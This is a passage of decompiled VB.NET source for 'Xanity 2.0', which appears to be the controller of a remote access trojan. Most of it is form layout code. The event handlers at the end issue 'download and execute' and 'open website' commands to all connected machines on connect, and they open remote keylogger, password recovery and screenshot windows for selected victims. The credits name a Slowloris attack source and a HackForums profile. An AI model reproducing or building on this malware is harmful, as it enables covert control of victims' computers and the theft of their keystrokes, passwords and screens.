            Me.tb_runfile.Multiline = False
            Me.tb_runfile.Name = "tb_runfile"
            Me.tb_runfile.ReadOnly = False
            size2 = New Size(290, &H1D)
            Me.tb_runfile.Size = size2
            Me.tb_runfile.TabIndex = 5
            Me.tb_runfile.TextAlign = HorizontalAlignment.Left
            Me.tb_runfile.TextColor = Color.White
            Me.tb_runfile.UseSystemPasswordChar = False
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel2.ForeColor = Color.White
            point2 = New Point(&H65, &H57)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(&H97, &H13)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 4
            Me.FlatLabel2.Text = "Download and Execute:"
            Me.toggledownload.BackColor = Color.Transparent
            Me.toggledownload.Checked = False
            Me.toggledownload.Cursor = Cursors.Hand
            Me.toggledownload.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, 80)
            Me.toggledownload.Location = point2
            Me.toggledownload.Name = "toggledownload"
            Me.toggledownload.Options = _Options.Style1
            size2 = New Size(&H4C, &H21)
            Me.toggledownload.Size = size2
            Me.toggledownload.TabIndex = 3
            Me.toggledownload.Text = "FlatToggle1"
            Me.tb_web.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            point2 = New Point(210, &H2B)
            Me.tb_web.Location = point2
            Me.tb_web.MaxLength = &H7FFF
            Me.tb_web.Multiline = False
            Me.tb_web.Name = "tb_web"
            Me.tb_web.ReadOnly = False
            size2 = New Size(&H152, &H1D)
            Me.tb_web.Size = size2
            Me.tb_web.TabIndex = 2
            Me.tb_web.TextAlign = HorizontalAlignment.Left
            Me.tb_web.TextColor = Color.White
            Me.tb_web.UseSystemPasswordChar = False
            Me.toggleweb.BackColor = Color.Transparent
            Me.toggleweb.Checked = False
            Me.toggleweb.Cursor = Cursors.Hand
            Me.toggleweb.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, &H29)
            Me.toggleweb.Location = point2
            Me.toggleweb.Name = "toggleweb"
            Me.toggleweb.Options = _Options.Style1
            size2 = New Size(&H4C, &H21)
            Me.toggleweb.Size = size2
            Me.toggleweb.TabIndex = 1
            Me.toggleweb.Text = "FlatToggle1"
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(&H65, &H2F)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H67, &H13)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 0
            Me.FlatLabel1.Text = "Open Website: "
            Me.TabPage7.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage7.Controls.Add(Me.LinkLabel1)
            Me.TabPage7.Controls.Add(Me.FlatLabel12)
            Me.TabPage7.Controls.Add(Me.PictureBox1)
            point2 = New Point(140, 4)
            Me.TabPage7.Location = point2
            Me.TabPage7.Name = "TabPage7"
            size2 = New Size(&H240, &HEB)
            Me.TabPage7.Size = size2
            Me.TabPage7.TabIndex = 2
            Me.TabPage7.Text = "About"
            Me.LinkLabel1.AutoSize = True
            Me.LinkLabel1.Font = New Font("Segoe UI", 10!)
            point2 = New Point(330, &H8B)
            Me.LinkLabel1.Location = point2
            Me.LinkLabel1.Name = "LinkLabel1"
            size2 = New Size(&H26, &H13)
            Me.LinkLabel1.Size = size2
            Me.LinkLabel1.TabIndex = 5
            Me.LinkLabel1.TabStop = True
            Me.LinkLabel1.Text = "Here"
            Me.FlatLabel12.AutoSize = True
            Me.FlatLabel12.BackColor = Color.Transparent
            Me.FlatLabel12.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel12.ForeColor = Color.White
            point2 = New Point(&H147, &H20)
            Me.FlatLabel12.Location = point2
            Me.FlatLabel12.Name = "FlatLabel12"
            size2 = New Size(&HF8, &H5B)
            Me.FlatLabel12.Size = size2
            Me.FlatLabel12.TabIndex = 4
            Me.FlatLabel12.Text = manager.GetString("FlatLabel12.Text")
            Me.PictureBox1.Image = Resources.logo
            point2 = New Point(3, &H1C)
            Me.PictureBox1.Location = point2
            Me.PictureBox1.Name = "PictureBox1"
            size2 = New Size(&H141, &HAC)
            Me.PictureBox1.Size = size2
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 3
            Me.PictureBox1.TabStop = False
            Me.TabPage8.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage8.Controls.Add(Me.FlatGroupBox10)
            point2 = New Point(140, 4)
            Me.TabPage8.Location = point2
            Me.TabPage8.Name = "TabPage8"
            size2 = New Size(&H240, &HEB)
            Me.TabPage8.Size = size2
            Me.TabPage8.TabIndex = 3
            Me.TabPage8.Text = "Credits"
            Me.FlatGroupBox10.BackColor = Color.Transparent
            Me.FlatGroupBox10.BaseColor = Color.White
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel21)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel19)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel18)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel17)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel16)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel15)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel14)
            Me.FlatGroupBox10.Controls.Add(Me.FlatLabel13)
            Me.FlatGroupBox10.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, &H17)
            Me.FlatGroupBox10.Location = point2
            Me.FlatGroupBox10.Name = "FlatGroupBox10"
            Me.FlatGroupBox10.ShowText = True
            size2 = New Size(&H1D4, &H91)
            Me.FlatGroupBox10.Size = size2
            Me.FlatGroupBox10.TabIndex = 4
            Me.FlatGroupBox10.Text = "Contributors"
            Me.FlatLabel21.AutoSize = True
            Me.FlatLabel21.BackColor = Color.Transparent
            Me.FlatLabel21.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel21.ForeColor = Color.Black
            point2 = New Point(&HCF, &H6F)
            Me.FlatLabel21.Location = point2
            Me.FlatLabel21.Name = "FlatLabel21"
            size2 = New Size(&HA1, 13)
            Me.FlatLabel21.Size = size2
            Me.FlatLabel21.TabIndex = 7
            Me.FlatLabel21.Text = "Shockwave - SlowLoris Source"
            Me.FlatLabel19.AutoSize = True
            Me.FlatLabel19.BackColor = Color.Transparent
            Me.FlatLabel19.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel19.ForeColor = Color.Black
            point2 = New Point(&HCF, &H57)
            Me.FlatLabel19.Location = point2
            Me.FlatLabel19.Name = "FlatLabel19"
            size2 = New Size(&H9E, 13)
            Me.FlatLabel19.Size = size2
            Me.FlatLabel19.TabIndex = 6
            Me.FlatLabel19.Text = "Aeonhack - NetSeal Licensing"
            Me.FlatLabel18.AutoSize = True
            Me.FlatLabel18.BackColor = Color.Transparent
            Me.FlatLabel18.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel18.ForeColor = Color.Black
            point2 = New Point(&HCF, &H3F)
            Me.FlatLabel18.Location = point2
            Me.FlatLabel18.Name = "FlatLabel18"
            size2 = New Size(&H9D, 13)
            Me.FlatLabel18.Size = size2
            Me.FlatLabel18.TabIndex = 5
            Me.FlatLabel18.Text = "DamDomy - AnonScanner API"
            Me.FlatLabel17.AutoSize = True
            Me.FlatLabel17.BackColor = Color.Transparent
            Me.FlatLabel17.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel17.ForeColor = Color.Black
            point2 = New Point(&HCF, 40)
            Me.FlatLabel17.Location = point2
            Me.FlatLabel17.Name = "FlatLabel17"
            size2 = New Size(&HC4, 13)
            Me.FlatLabel17.Size = size2
            Me.FlatLabel17.TabIndex = 4
            Me.FlatLabel17.Text = "Madara Uchiha - Some Source Codes"
            Me.FlatLabel16.AutoSize = True
            Me.FlatLabel16.BackColor = Color.Transparent
            Me.FlatLabel16.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel16.ForeColor = Color.Black
            point2 = New Point(&H12, &H6F)
            Me.FlatLabel16.Location = point2
            Me.FlatLabel16.Name = "FlatLabel16"
            size2 = New Size(&HB0, 13)
            Me.FlatLabel16.Size = size2
            Me.FlatLabel16.TabIndex = 3
            Me.FlatLabel16.Text = "Demoralize - Logo and Signature"
            Me.FlatLabel15.AutoSize = True
            Me.FlatLabel15.BackColor = Color.Transparent
            Me.FlatLabel15.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel15.ForeColor = Color.Black
            point2 = New Point(&H12, &H57)
            Me.FlatLabel15.Location = point2
            Me.FlatLabel15.Name = "FlatLabel15"
            size2 = New Size(&HB5, 13)
            Me.FlatLabel15.Size = size2
            Me.FlatLabel15.TabIndex = 2
            Me.FlatLabel15.Text = "antidot - Logo and Thread Design"
            Me.FlatLabel14.AutoSize = True
            Me.FlatLabel14.BackColor = Color.Transparent
            Me.FlatLabel14.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel14.ForeColor = Color.Black
            point2 = New Point(&H12, &H3F)
            Me.FlatLabel14.Location = point2
            Me.FlatLabel14.Name = "FlatLabel14"
            size2 = New Size(&H89, 13)
            Me.FlatLabel14.Size = size2
            Me.FlatLabel14.TabIndex = 1
            Me.FlatLabel14.Text = "iSynthesis - Flat UI Theme"
            Me.FlatLabel13.AutoSize = True
            Me.FlatLabel13.BackColor = Color.Transparent
            Me.FlatLabel13.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel13.ForeColor = Color.Black
            point2 = New Point(&H12, 40)
            Me.FlatLabel13.Location = point2
            Me.FlatLabel13.Name = "FlatLabel13"
            size2 = New Size(&HB7, 13)
            Me.FlatLabel13.Size = size2
            Me.FlatLabel13.TabIndex = 0
            Me.FlatLabel13.Text = "XilluX - Main Coder and Developer"
            Me.TabPage9.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage9.Controls.Add(Me.FlatGroupBox11)
            point2 = New Point(140, 4)
            Me.TabPage9.Location = point2
            Me.TabPage9.Name = "TabPage9"
            size2 = New Size(&H240, &HEB)
            Me.TabPage9.Size = size2
            Me.TabPage9.TabIndex = 4
            Me.TabPage9.Text = "NetSeal"
            Me.FlatGroupBox11.BackColor = Color.Transparent
            Me.FlatGroupBox11.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox11.Controls.Add(Me.Opennsbtn)
            Me.FlatGroupBox11.Controls.Add(Me.NetSealtb5)
            Me.FlatGroupBox11.Controls.Add(Me.NetSealtb4)
            Me.FlatGroupBox11.Controls.Add(Me.NetSealtb3)
            Me.FlatGroupBox11.Controls.Add(Me.NetSealtb2)
            Me.FlatGroupBox11.Controls.Add(Me.NetSealtb1)
            Me.FlatGroupBox11.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, 3)
            Me.FlatGroupBox11.Location = point2
            Me.FlatGroupBox11.Name = "FlatGroupBox11"
            Me.FlatGroupBox11.ShowText = True
            size2 = New Size(&H23D, &HE8)
            Me.FlatGroupBox11.Size = size2
            Me.FlatGroupBox11.TabIndex = 0
            Me.FlatGroupBox11.Text = "NetSeal Information"
            Me.Opennsbtn.BackColor = Color.Transparent
            Me.Opennsbtn.BaseColor = Color.DeepPink
            Me.Opennsbtn.Cursor = Cursors.Hand
            Me.Opennsbtn.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H1B2, &HAF)
            Me.Opennsbtn.Location = point2
            Me.Opennsbtn.Name = "Opennsbtn"
            Me.Opennsbtn.Rounded = False
            size2 = New Size(&H75, &H20)
            Me.Opennsbtn.Size = size2
            Me.Opennsbtn.TabIndex = 5
            Me.Opennsbtn.Text = "Open NetSeal"
            Me.Opennsbtn.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.NetSealtb5.AutoSize = True
            Me.NetSealtb5.BackColor = Color.Transparent
            Me.NetSealtb5.Font = New Font("Segoe UI", 10!)
            Me.NetSealtb5.ForeColor = Color.White
            point2 = New Point(20, &HAF)
            Me.NetSealtb5.Location = point2
            Me.NetSealtb5.Name = "NetSealtb5"
            size2 = New Size(13, &H13)
            Me.NetSealtb5.Size = size2
            Me.NetSealtb5.TabIndex = 4
            Me.NetSealtb5.Text = " "
            Me.NetSealtb4.AutoSize = True
            Me.NetSealtb4.BackColor = Color.Transparent
            Me.NetSealtb4.Font = New Font("Segoe UI", 10!)
            Me.NetSealtb4.ForeColor = Color.White
            point2 = New Point(20, &H8E)
            Me.NetSealtb4.Location = point2
            Me.NetSealtb4.Name = "NetSealtb4"
            size2 = New Size(13, &H13)
            Me.NetSealtb4.Size = size2
            Me.NetSealtb4.TabIndex = 3
            Me.NetSealtb4.Text = " "
            Me.NetSealtb3.AutoSize = True
            Me.NetSealtb3.BackColor = Color.Transparent
            Me.NetSealtb3.Font = New Font("Segoe UI", 10!)
            Me.NetSealtb3.ForeColor = Color.White
            point2 = New Point(20, &H6D)
            Me.NetSealtb3.Location = point2
            Me.NetSealtb3.Name = "NetSealtb3"
            size2 = New Size(13, &H13)
            Me.NetSealtb3.Size = size2
            Me.NetSealtb3.TabIndex = 2
            Me.NetSealtb3.Text = " "
            Me.NetSealtb2.AutoSize = True
            Me.NetSealtb2.BackColor = Color.Transparent
            Me.NetSealtb2.Font = New Font("Segoe UI", 10!)
            Me.NetSealtb2.ForeColor = Color.White
            point2 = New Point(20, &H4D)
            Me.NetSealtb2.Location = point2
            Me.NetSealtb2.Name = "NetSealtb2"
            size2 = New Size(13, &H13)
            Me.NetSealtb2.Size = size2
            Me.NetSealtb2.TabIndex = 1
            Me.NetSealtb2.Text = " "
            Me.NetSealtb1.AutoSize = True
            Me.NetSealtb1.BackColor = Color.Transparent
            Me.NetSealtb1.Font = New Font("Segoe UI", 10!)
            Me.NetSealtb1.ForeColor = Color.White
            point2 = New Point(20, &H2D)
            Me.NetSealtb1.Location = point2
            Me.NetSealtb1.Name = "NetSealtb1"
            size2 = New Size(13, &H13)
            Me.NetSealtb1.Size = size2
            Me.NetSealtb1.TabIndex = 0
            Me.NetSealtb1.Text = " "
            Me.PageNews.BackColor = Color.FromArgb(60, 70, &H49)
            Me.PageNews.Controls.Add(Me.rtbnews)
            Me.PageNews.Controls.Add(Me.ListViewNews)
            point2 = New Point(4, &H2C)
            Me.PageNews.Location = point2
            Me.PageNews.Name = "PageNews"
            size2 = New Size(&H2D1, &HF4)
            Me.PageNews.Size = size2
            Me.PageNews.TabIndex = 3
            Me.PageNews.Text = "News"
            Me.rtbnews.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.rtbnews.ForeColor = Color.White
            point2 = New Point(&HFF, 3)
            Me.rtbnews.Location = point2
            Me.rtbnews.Name = "rtbnews"
            Me.rtbnews.ReadOnly = True
            size2 = New Size(&H1CF, &HEE)
            Me.rtbnews.Size = size2
            Me.rtbnews.TabIndex = 1
            Me.rtbnews.Text = ""
            Me.ListViewNews.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListViewNews.Columns.AddRange(New ColumnHeader() { Me.title, Me.time })
            Me.ListViewNews.ForeColor = Color.White
            Me.ListViewNews.FullRowSelect = True
            point2 = New Point(2, 3)
            Me.ListViewNews.Location = point2
            Me.ListViewNews.Name = "ListViewNews"
            size2 = New Size(&HF7, &HEE)
            Me.ListViewNews.Size = size2
            Me.ListViewNews.TabIndex = 0
            Me.ListViewNews.UseCompatibleStateImageBehavior = False
            Me.ListViewNews.View = View.Details
            Me.title.Text = "Title"
            Me.title.Width = &HA2
            Me.time.Text = "Date"
            Me.time.Width = 80
            Me.MaxButton.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.MaxButton.BackColor = Color.White
            Me.MaxButton.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.MaxButton.Enabled = False
            Me.MaxButton.Font = New Font("Marlett", 12!)
            point2 = New Point(&H2AF, 12)
            Me.MaxButton.Location = point2
            Me.MaxButton.Name = "MaxButton"
            size2 = New Size(&H12, &H12)
            Me.MaxButton.Size = size2
            Me.MaxButton.TabIndex = 2
            Me.MaxButton.Text = "FlatMax1"
            Me.MaxButton.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.MiniButton.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.MiniButton.BackColor = Color.White
            Me.MiniButton.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.MiniButton.Font = New Font("Marlett", 12!)
            point2 = New Point(&H297, 12)
            Me.MiniButton.Location = point2
            Me.MiniButton.Name = "MiniButton"
            size2 = New Size(&H12, &H12)
            Me.MiniButton.Size = size2
            Me.MiniButton.TabIndex = 1
            Me.MiniButton.Text = "FlatMini1"
            Me.MiniButton.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.CloseButton.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.CloseButton.BackColor = Color.White
            Me.CloseButton.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.CloseButton.Font = New Font("Marlett", 10!)
            point2 = New Point(&H2C7, 12)
            Me.CloseButton.Location = point2
            Me.CloseButton.Name = "CloseButton"
            size2 = New Size(&H12, &H12)
            Me.CloseButton.Size = size2
            Me.CloseButton.TabIndex = 0
            Me.CloseButton.Text = "FlatClose1"
            Me.CloseButton.TextColor = Color.White
            Me.MenuStrip1.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.MenuStrip1.Dock = DockStyle.None
            Me.MenuStrip1.Items.AddRange(New ToolStripItem() { Me.ConnectionToolStripMenuItem })
            point2 = New Point(10, &H36)
            Me.MenuStrip1.Location = point2
            Me.MenuStrip1.Name = "MenuStrip1"
            size2 = New Size(&H69, &H18)
            Me.MenuStrip1.Size = size2
            Me.MenuStrip1.TabIndex = 4
            Me.MenuStrip1.Text = "MenuStrip1"
            Me.ConnectionToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ConnectToolStripMenuItem, Me.DisconnectToolStripMenuItem, Me.AddNewToolStripMenuItem })
            Me.ConnectionToolStripMenuItem.ForeColor = Color.White
            Me.ConnectionToolStripMenuItem.Image = DirectCast(manager.GetObject("ConnectionToolStripMenuItem.Image"), Image)
            Me.ConnectionToolStripMenuItem.Name = "ConnectionToolStripMenuItem"
            size2 = New Size(&H61, 20)
            Me.ConnectionToolStripMenuItem.Size = size2
            Me.ConnectionToolStripMenuItem.Text = "Connection"
            Me.ConnectToolStripMenuItem.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.ConnectToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ConnectToAllToolStripMenuItem })
            Me.ConnectToolStripMenuItem.ForeColor = Color.White
            Me.ConnectToolStripMenuItem.Image = DirectCast(manager.GetObject("ConnectToolStripMenuItem.Image"), Image)
            Me.ConnectToolStripMenuItem.Name = "ConnectToolStripMenuItem"
            size2 = New Size(&HA7, &H16)
            Me.ConnectToolStripMenuItem.Size = size2
            Me.ConnectToolStripMenuItem.Text = "Connect"
            Me.ConnectToAllToolStripMenuItem.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.ConnectToAllToolStripMenuItem.ForeColor = Color.White
            Me.ConnectToAllToolStripMenuItem.Image = DirectCast(manager.GetObject("ConnectToAllToolStripMenuItem.Image"), Image)
            Me.ConnectToAllToolStripMenuItem.Name = "ConnectToAllToolStripMenuItem"
            Me.ConnectToAllToolStripMenuItem.ShortcutKeys = (Keys.Control Or Keys.D)
            size2 = New Size(&HC2, &H16)
            Me.ConnectToAllToolStripMenuItem.Size = size2
            Me.ConnectToAllToolStripMenuItem.Text = "Connect to All"
            Me.DisconnectToolStripMenuItem.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.DisconnectToolStripMenuItem.ForeColor = Color.White
            Me.DisconnectToolStripMenuItem.Image = DirectCast(manager.GetObject("DisconnectToolStripMenuItem.Image"), Image)
            Me.DisconnectToolStripMenuItem.Name = "DisconnectToolStripMenuItem"
            size2 = New Size(&HA7, &H16)
            Me.DisconnectToolStripMenuItem.Size = size2
            Me.DisconnectToolStripMenuItem.Text = "Disconnect"
            Me.AddNewToolStripMenuItem.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.AddNewToolStripMenuItem.ForeColor = Color.White
            Me.AddNewToolStripMenuItem.Image = DirectCast(manager.GetObject("AddNewToolStripMenuItem.Image"), Image)
            Me.AddNewToolStripMenuItem.Name = "AddNewToolStripMenuItem"
            Me.AddNewToolStripMenuItem.ShortcutKeys = (Keys.Control Or Keys.A)
            size2 = New Size(&HA7, &H16)
            Me.AddNewToolStripMenuItem.Size = size2
            Me.AddNewToolStripMenuItem.Text = "Add New"
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H2E5, &H18E)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Form1"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Xanity 2.0"
            Me.TransparencyKey = Color.Fuchsia
            Me.rightclick.ResumeLayout(False)
            Me.notifyrightclick.ResumeLayout(False)
            Me.ContextDeleteHosts.ResumeLayout(False)
            Me.FormSkin1.ResumeLayout(False)
            Me.FormSkin1.PerformLayout
            Me.TabControl1.ResumeLayout(False)
            Me.PageMain.ResumeLayout(False)
            Me.PageBuilder.ResumeLayout(False)
            Me.DotNetBarTabcontrol1.ResumeLayout(False)
            Me.TabPage1.ResumeLayout(False)
            Me.FlatGroupBox6.ResumeLayout(False)
            Me.Panel1.ResumeLayout(False)
            Me.FlatGroupBox5.ResumeLayout(False)
            Me.FlatGroupBox5.PerformLayout
            Me.FlatGroupBox4.ResumeLayout(False)
            Me.TabPage2.ResumeLayout(False)
            Me.TabPage2.PerformLayout
            Me.TabPage3.ResumeLayout(False)
            Me.FlatGroupBox8.ResumeLayout(False)
            Me.FlatGroupBox7.ResumeLayout(False)
            DirectCast(Me.PictureBox_Icon, ISupportInitialize).EndInit
            Me.TabPage4.ResumeLayout(False)
            Me.TabPage4.PerformLayout
            Me.Panel2.ResumeLayout(False)
            DirectCast(Me.pb_scan, ISupportInitialize).EndInit
            Me.PageSettings.ResumeLayout(False)
            Me.DotNetBarTabcontrol2.ResumeLayout(False)
            Me.TabPage5.ResumeLayout(False)
            Me.FlatGroupBox2.ResumeLayout(False)
            Me.FlatGroupBox1.ResumeLayout(False)
            Me.TabPage6.ResumeLayout(False)
            Me.FlatGroupBox3.ResumeLayout(False)
            Me.FlatGroupBox3.PerformLayout
            Me.TabPage7.ResumeLayout(False)
            Me.TabPage7.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.TabPage8.ResumeLayout(False)
            Me.FlatGroupBox10.ResumeLayout(False)
            Me.FlatGroupBox10.PerformLayout
            Me.TabPage9.ResumeLayout(False)
            Me.FlatGroupBox11.ResumeLayout(False)
            Me.FlatGroupBox11.PerformLayout
            Me.PageNews.ResumeLayout(False)
            Me.MenuStrip1.ResumeLayout(False)
            Me.MenuStrip1.PerformLayout
            Me.ResumeLayout(False)
        End Sub

        Private Sub LinkLabel1_LinkClicked(ByVal sender As Object, ByVal e As LinkLabelLinkClickedEventArgs)
            Process.Start("http://www.hackforums.net/member.php?action=profile&uid=1799321")
        End Sub

        Private Sub ListViewNews_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListViewNews.SelectedIndices.Count <> 0) Then
                    Me.rtbnews.Clear
                    Me.ID = CInt(Me.ListViewNews.SelectedItems.Item(0).Tag)
                    Me.retrieve = New Thread(New ThreadStart(AddressOf Me.RetrieveNews))
                    Me.retrieve.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub MapViewToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim enumerator As IEnumerator
                Try 
                    enumerator = Me.listviewmain.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim mapView As MapView = MyProject.Forms.MapView
                        mapView.connected = (mapView.connected & current.SubItems.Item(2).Text & "|")
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator,IDisposable).Dispose
                    End If
                End Try
                MyProject.Forms.MapView.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub MiscellaneousToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.misc.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.misc.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Notify_MouseDoubleClick(ByVal sender As Object, ByVal e As MouseEventArgs)
            Me.Show
            Me.Focus
        End Sub

        Public Sub onconnect()
            Try 
                If MySettingsProperty.Settings.onconnect_down Then
                    Dim num3 As Integer = (Me.listviewmain.Items.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim str As String = String.Concat(New String() { Me.listviewmain.Items.Item(i).SubItems.Item(6).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(1).Text, "@", Me.listviewmain.Items.Item(i).SubItems.Item(2).Text })
                        Dim host As String = str.Split(New Char() { "|"c })(0)
                        Dim file As String = str.Split(New Char() { "|"c })(1)
                        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd(("Down|" & MySettingsProperty.Settings.onc_down), host, file), True, False))) Then
                            Me.AddtoStatusBar("An error occured, by downloading and executing your program (OnConnect)!")
                        Else
                            Me.AddtoStatusBar("Downloaded and Executed was successfull ! (OnConnect)")
                        End If
                        i += 1
                    Loop
                ElseIf MySettingsProperty.Settings.onconnect_web Then
                    Dim num4 As Integer = (Me.listviewmain.Items.Count - 1)
                    Dim j As Integer = 0
                    Do While (j <= num4)
                        Dim str4 As String = String.Concat(New String() { Me.listviewmain.Items.Item(j).SubItems.Item(6).Text, "|", Me.listviewmain.Items.Item(j).SubItems.Item(1).Text, "@", Me.listviewmain.Items.Item(j).SubItems.Item(2).Text })
                        Dim str6 As String = str4.Split(New Char() { "|"c })(0)
                        Dim str5 As String = str4.Split(New Char() { "|"c })(1)
                        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd(("Website|" & MySettingsProperty.Settings.onc_website), str6, str5), True, False))) Then
                            Me.AddtoStatusBar("An error occured, by opening a Website (OnConnect)!")
                        Else
                            Me.AddtoStatusBar("Website was opened successfull ! (OnConnect)")
                        End If
                        j += 1
                    Loop
                End If
                Me.onc += 1
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Opennsbtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            LicenseGlobal.Seal.ShowAccount
        End Sub

        Private Sub OSToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.GroupListView(Me.listviewmain, 3)
            Me.groupparameter = 3
        End Sub

        Private Sub PasswordRecoveryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.passes.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.passes.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub PrivilegsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.GroupListView(Me.listviewmain, 5)
            Me.groupparameter = 5
        End Sub

        Private Sub rd_runfile_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.onconnect_down = Me.toggledownload.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub RemoteKeyloggerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.keylogger.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.keylogger.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RemoteScreenshotToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.remotescreen.selected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.remotescreen.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

